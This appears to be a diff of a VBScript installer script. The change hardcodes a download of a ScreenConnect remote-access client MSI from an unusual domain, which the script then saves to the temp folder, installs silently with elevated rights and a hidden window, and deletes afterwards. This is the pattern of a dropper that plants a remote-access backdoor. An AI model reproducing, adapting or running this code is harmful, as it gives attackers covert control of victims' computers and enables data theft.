@@ -9,19 +9,9 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
     WScript.Quit
 End If
 
-Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell, objFile
-
-' Read URL from file
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
-
-' Open and read the URL file
-Set objFile = objFSO.OpenTextFile(strTemp & "\download_url.txt", 1)
-strUrl = objFile.ReadAll
-objFile.Close
-
-' Set file path for installer
+Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
+strUrl = "https://hayw.fussionmann.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
 ' Download
@@ -41,16 +31,15 @@ If objXMLHTTP.Status = 200 Then
     objADOStream.Open
     objADOStream.Type = 1 ' Binary
     objADOStream.Write objXMLHTTP.ResponseBody
-    objADOStream.Position = 0 ' Reset position before saving
+    objADOStream.Position = 0
     objADOStream.SaveToFile strFile, 2 ' Overwrite
     objADOStream.Close
     
     ' Install
     Set objShell = CreateObject("WScript.Shell")
-    objShell.Run """" & strFile & """ /S", 0, True
+    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
     
     ' Cleanup
     Set objFSO = CreateObject("Scripting.FileSystemObject")
     If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
-    If objFSO.FileExists(strTemp & "\download_url.txt") Then objFSO.DeleteFile strTemp & "\download_url.txt"
 End If
